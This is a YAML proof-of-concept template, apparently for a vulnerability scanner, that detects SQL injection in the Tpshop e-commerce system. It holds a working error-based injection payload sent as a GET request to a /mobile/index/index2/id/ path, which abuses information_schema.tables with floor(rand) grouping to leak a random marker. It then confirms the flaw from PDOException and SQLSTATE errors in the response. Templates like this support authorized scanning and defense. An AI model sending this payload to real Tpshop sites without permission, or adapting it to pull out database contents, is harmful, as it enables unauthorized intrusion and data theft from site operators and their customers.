id: poc-yaml-tpshop-sqli
info:
  name: Tpshop SQL注入漏洞
  severity: medium
  tags:
  - sql-injection
  finger: Tpshop
  reference: []
  description: null
variables:
  r: md5(random_int(10000, 21000))
transport: http
requests:
- method: GET
  path: /mobile/index/index2/id/1) and (select 1 from (select count(*),concat(0x716b627671,(select
    {{.r}}),0x716b627671,floor(rand(0)*2))x from information_schema.tables group by
    x)a)--
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 500 && contains(body,r) && contains(body,"PDOException")
    && contains(body,"SQLSTATE")
  output: []
